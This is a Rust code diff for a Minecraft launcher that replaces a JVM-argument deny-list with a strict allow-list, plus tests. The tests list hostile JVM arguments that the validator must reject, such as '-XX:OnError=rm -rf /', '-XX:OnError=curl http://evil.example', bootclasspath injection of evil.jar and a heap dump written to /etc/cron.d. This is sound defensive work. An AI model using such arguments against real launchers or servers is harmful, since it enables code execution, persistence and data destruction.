@@ -39,29 +39,161 @@ const OUT_OF_MEMORY_REASON: &str =
 
 const DISABLE_ATTACH_FLAG: &str = "-XX:+DisableAttachMechanism";
 
-const FORBIDDEN_JVM_ARG_PREFIXES: &[&str] = &[
-    "-agentlib:",
-    "-agentpath:",
-    "-javaagent:",
-    "-Xrunjdwp",
-    "-Xdebug",
-    "-Dcom.sun.management.jmxremote",
+const SIZE_JVM_FLAGS: &[&str] = &["-Xms", "-Xmx", "-Xmn", "-Xss"];
+
+const MODULE_VALUE_OPTIONS: &[&str] = &[
+    "-p",
+    "--module-path",
+    "--upgrade-module-path",
+    "--limit-modules",
+    "--add-modules",
+    "--add-opens",
+    "--add-exports",
+    "--add-reads",
+    "--patch-module",
+    "--enable-native-access",
 ];
 
+const ALLOWED_XX_VALUE_KEYS: &[&str] = &[
+    "MaxHeapSize",
+    "MinHeapSize",
+    "InitialHeapSize",
+    "SoftMaxHeapSize",
+    "MaxHeapFreeRatio",
+    "MinHeapFreeRatio",
+    "NewSize",
+    "MaxNewSize",
+    "NewRatio",
+    "SurvivorRatio",
+    "TargetSurvivorRatio",
+    "MaxTenuringThreshold",
+    "MetaspaceSize",
+    "MaxMetaspaceSize",
+    "CompressedClassSpaceSize",
+    "ReservedCodeCacheSize",
+    "MaxDirectMemorySize",
+    "MaxRAMPercentage",
+    "InitialRAMPercentage",
+    "MinRAMPercentage",
+    "MaxGCPauseMillis",
+    "InitiatingHeapOccupancyPercent",
+    "G1NewSizePercent",
+    "G1MaxNewSizePercent",
+    "G1HeapRegionSize",
+    "G1ReservePercent",
+    "G1HeapWastePercent",
+    "G1MixedGCCountTarget",
+    "G1MixedGCLiveThresholdPercent",
+    "G1RSetUpdatingPauseTimePercent",
+    "G1PeriodicGCInterval",
+    "ParallelGCThreads",
+    "ConcGCThreads",
+    "ActiveProcessorCount",
+    "CompileThreshold",
+    "TrimNativeHeapInterval",
+];
+
+const ALLOWED_D_PROPERTY_KEYS: &[&str] = &[
+    "file.encoding",
+    "sun.jnu.encoding",
+    "java.awt.headless",
+    "java.io.tmpdir",
+    "java.library.path",
+    "java.net.preferIPv4Stack",
+    "java.net.preferIPv6Addresses",
+    "java.rmi.server.useCodebaseOnly",
+    "jna.tmpdir",
+    "org.lwjgl.system.SharedLibraryExtractPath",
+    "io.netty.native.workdir",
+    "sun.rmi.dgc.server.gcInterval",
+    "sun.rmi.dgc.client.gcInterval",
+    "user.timezone",
+    "ignoreList",
+    "mergeModules",
+    "libraryDirectory",
+];
+
+const ALLOWED_D_PROPERTY_PREFIXES: &[&str] =
+    &["forge.", "neoforge.", "minecraft.launcher.", "log4j2."];
+
+fn is_size_value(value: &str) -> bool {
+    let digits = value
+        .strip_suffix(|c: char| matches!(c, 'k' | 'K' | 'm' | 'M' | 'g' | 'G'))
+        .unwrap_or(value);
+    !digits.is_empty() && digits.bytes().all(|b| b.is_ascii_digit())
+}
+
+fn is_flag_name(name: &str) -> bool {
+    name.chars().next().is_some_and(|c| c.is_ascii_alphabetic())
+        && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
+fn is_bare_heap_dump_name(value: &str) -> bool {
+    !value.is_empty() && !value.contains('/') && !value.contains('\\') && !value.contains("..")
+}
+
+fn is_allowed_jvm_arg(arg: &str) -> bool {
+    if arg == "-XstartOnFirstThread" {
+        return true;
+    }
+    if SIZE_JVM_FLAGS
+        .iter()
+        .any(|flag| arg.starts_with(flag) && is_size_value(&arg[flag.len()..]))
+    {
+        return true;
+    }
+    if let Some(rest) = arg
+        .strip_prefix("-XX:+")
+        .or_else(|| arg.strip_prefix("-XX:-"))
+    {
+        return is_flag_name(rest);
+    }
+    if let Some(rest) = arg.strip_prefix("-XX:") {
+        let Some((key, value)) = rest.split_once('=') else {
+            return false;
+        };
+        if !is_flag_name(key) {
+            return false;
+        }
+        if key == "HeapDumpPath" {
+            return is_bare_heap_dump_name(value);
+        }
+        return !value.is_empty() && ALLOWED_XX_VALUE_KEYS.contains(&key);
+    }
+    if let Some(rest) = arg.strip_prefix("-D") {
+        let key = rest.split_once('=').map(|(k, _)| k).unwrap_or(rest);
+        return !key.is_empty()
+            && (ALLOWED_D_PROPERTY_KEYS.contains(&key)
+                || ALLOWED_D_PROPERTY_PREFIXES
+                    .iter()
+                    .any(|prefix| key.starts_with(prefix)));
+    }
+    MODULE_VALUE_OPTIONS.iter().any(|option| {
+        arg.strip_prefix(option)
+            .is_some_and(|value| value.starts_with('=') && value.len() > 1)
+    })
+}
+
 pub(crate) fn validate_jvm_args(jvm_args: &[String]) -> Result<()> {
-    let forbidden = jvm_args.iter().find_map(|arg| {
-        FORBIDDEN_JVM_ARG_PREFIXES
-            .iter()
-            .find(|prefix| arg.starts_with(**prefix))
-            .map(|_| arg.as_str())
-    });
-    let Some(arg) = forbidden else {
-        return Ok(());
-    };
-    Err(LauncherError::GameProcess(format!(
-        "В JVM-аргументах проекта указан запрещённый параметр «{arg}»: debug-агенты и удалённое управление JVM отключены в целях безопасности. Удалите его в настройках проекта"
-    ))
-    .into())
+    let mut option_value_next = false;
+    for arg in jvm_args {
+        if option_value_next {
+            option_value_next = false;
+            continue;
+        }
+        if MODULE_VALUE_OPTIONS.contains(&arg.as_str()) {
+            option_value_next = true;
+            continue;
+        }
+        if is_allowed_jvm_arg(arg) {
+            continue;
+        }
+        return Err(LauncherError::GameProcess(format!(
+            "В JVM-аргументах проекта указан запрещённый параметр «{arg}»: разрешены только параметры памяти, GC-тюнинга, системные свойства из списка и модульные опции JDK. Удалите его в настройках проекта"
+        ))
+        .into());
+    }
+    Ok(())
 }
 
 fn finalize_jvm_args(
@@ -577,6 +709,39 @@ mod jvm_args_guard_tests {
     }
 
     #[test]
+    fn blocks_command_execution_and_classpath_escape_flags() {
+        for arg in [
+            "-XX:OnError=rm -rf /",
+            "-XX:OnError=",
+            "-XX:OnOutOfMemoryError=shutdown /s",
+            "-Xbootclasspath/a:/tools/evil.jar",
+            "-Xbootclasspath/p:/tools/evil.jar",
+            "-XX:CompileCommandFile=/tmp/commands.txt",
+            "-XX:VMOptionsFile=/tmp/options",
+            "-XX:Flags=/tmp/flags",
+            "-XX:StartFlightRecording=filename=/tmp/rec.jfr",
+            "-XX:HeapDumpPath=/etc/cron.d/pwn",
+            "-XX:HeapDumpPath=../../escape.dump",
+            "-Djavax.net.ssl.trustStore=/tools/evil.jks",
+            "-Djavax.net.ssl.trustStorePassword=secret",
+            "-Djava.security.manager=EvilManager",
+            "-Djava.rmi.server.codebase=http://evil.example/",
+            "-Djava.system.class.loader=EvilLoader",
+            "-DsocksProxyHost=evil.example",
+            "-jar",
+            "/tools/evil.jar",
+            "-Xverify:none",
+            "-ea:cpw.mods.modlauncher...",
+        ] {
+            let message = validation_error(&[arg]);
+            assert!(
+                message.contains(arg),
+                "ошибка должна называть аргумент {arg}: {message}"
+            );
+        }
+    }
+
+    #[test]
     fn names_forbidden_flag_from_mixed_list() {
         let message = validation_error(&[
             "-Xmx4G",
@@ -595,21 +760,138 @@ mod jvm_args_guard_tests {
     fn allows_standard_args_and_presets() {
         let args: Vec<String> = [
             "-XX:+UseG1GC",
+            "-XX:+ParallelRefProcEnabled",
+            "-XX:MaxGCPauseMillis=200",
+            "-XX:+UnlockExperimentalVMOptions",
+            "-XX:+DisableExplicitGC",
+            "-XX:G1NewSizePercent=30",
+            "-XX:G1MaxNewSizePercent=40",
+            "-XX:G1HeapRegionSize=8M",
+            "-XX:G1ReservePercent=20",
+            "-XX:G1HeapWastePercent=5",
+            "-XX:G1MixedGCCountTarget=4",
+            "-XX:InitiatingHeapOccupancyPercent=15",
+            "-XX:G1MixedGCLiveThresholdPercent=90",
+            "-XX:G1RSetUpdatingPauseTimePercent=5",
+            "-XX:SurvivorRatio=32",
+            "-XX:+PerfDisableSharedMem",
+            "-XX:MaxTenuringThreshold=1",
             "-XX:-DisableAttachMechanism",
             "-XX:+DisableAttachMechanism",
+            "-XX:+UseSerialGC",
+            "-XX:+UseZGC",
+            "-XX:+UseStringDeduplication",
+            "-XX:+AlwaysPreTouch",
+            "-XX:TrimNativeHeapInterval=5000",
             "-Xms512M",
             "-Xmx4G",
             "-Xss1M",
+            "-Xmn256m",
+            "-XstartOnFirstThread",
             "-Dfile.encoding=UTF-8",
             "-Dsun.rmi.dgc.server.gcInterval=2147483646",
+            "-Dsun.rmi.dgc.client.gcInterval=2147483646",
             "-Djava.library.path=/game/natives",
-            "--add-modules=jdk.incubator.vector",
+            "-Djava.io.tmpdir=/game/natives",
+            "-Djna.tmpdir=/game/natives",
+            "-Dorg.lwjgl.system.SharedLibraryExtractPath=/game/natives",
+            "-Dio.netty.native.workdir=/game",
+            "-Djava.awt.headless",
+            "-Duser.timezone=Europe/Moscow",
+            "-Djava.rmi.server.useCodebaseOnly=true",
+            "-XX:HeapDumpPath=MojangTricksIntelDriversForPerformance_javaw.exe_minecraft.game.minecraft.exe.heapdump",
+            "-XX:+HeapDumpOnOutOfMemoryError",
+            "-XX:MaxMetaspaceSize=1G",
+            "-XX:MetaspaceSize=512M",
+            "-XX:CompressedClassSpaceSize=256M",
+            "-XX:ReservedCodeCacheSize=512M",
+            "-XX:MaxDirectMemorySize=2G",
+            "-XX:MaxRAMPercentage=80.0",
+            "-XX:ParallelGCThreads=4",
+            "-XX:ConcGCThreads=2",
+            "-XX:ActiveProcessorCount=4",
         ]
         .iter()
         .map(|arg| arg.to_string())
         .collect();
 
         validate_jvm_args(&args).expect("штатные аргументы пресетов не должны запрещаться");
+    }
+
+    #[test]
+    fn allows_loader_and_manifest_property_args() {
+        let args: Vec<String> = [
+            "-Djava.net.preferIPv6Addresses=system",
+            "-Djava.net.preferIPv4Stack=false",
+            "-DignoreList=bootstraplauncher,securejarhandler,client-extra,1.20.4.jar",
+            "-DmergeModules=jna-5.10.0.jar,jna-platform-5.10.0.jar",
+            "-DlibraryDirectory=/game/libraries",
+            "-Dforge.enabledGameTestNamespaces=demo",
+            "-Dneoforge.enabledGameTestNamespaces=demo",
+            "-Dforge.forceNoTrace=true",
+            "-Dlog4j2.formatMsgNoLookups=true",
+            "-Dminecraft.launcher.brand=Limacina",
+            "-Dminecraft.launcher.version=1.20.4",
+            "--add-modules=jdk.incubator.vector",
+            "--enable-native-access=ALL-UNNAMED",
+        ]
+        .iter()
+        .map(|arg| arg.to_string())
+        .collect();
+
+        validate_jvm_args(&args).expect("аргументы лоадеров и манифестов не должны запрещаться");
+    }
+
+    #[test]
+    fn module_path_value_token_is_skipped() {
+        let args: Vec<String> = [
+            "-p",
+            "/game/libraries/cpw/mods/securejarhandler/2.1.24/securejarhandler-2.1.24.jar:/game/libraries/org/ow2/asm/asm/9.5/asm-9.5.jar",
+            "--add-opens",
+            "java.base/java.lang=ALL-UNNAMED",
+            "--module-path=/game/libraries",
+            "-Xmx4G",
+        ]
+        .iter()
+        .map(|arg| arg.to_string())
+        .collect();
+
+        validate_jvm_args(&args).expect("значение module-path — путь, а не опция");
+    }
+
+    #[test]
+    fn server_config_with_dangerous_arg_aborts_launch() {
+        let server_args: Vec<String> = [
+            "-Xms512M",
+            "-Xmx4G",
+            "-Dfile.encoding=UTF-8",
+            "-XX:+UseG1GC",
+            "-XX:OnError=curl http://evil.example",
+        ]
+        .iter()
+        .map(|arg| arg.to_string())
+        .collect();
+
+        let error = finalize_jvm_args(server_args, None, true)
+            .expect_err("опасный аргумент из серверного конфига должен отклонять запуск");
+
+        assert!(
+            error
+                .to_string()
+                .contains("-XX:OnError=curl http://evil.example"),
+            "ошибка должна называть опасный аргумент: {error}"
+        );
+
+        let safe_args: Vec<String> = [
+            "-Xms512M",
+            "-Xmx4G",
+            "-Dfile.encoding=UTF-8",
+            "-XX:+UseG1GC",
+        ]
+        .iter()
+        .map(|arg| arg.to_string())
+        .collect();
+        finalize_jvm_args(safe_args, None, true).expect("безопасный серверный конфиг запускается");
     }
 
     #[test]
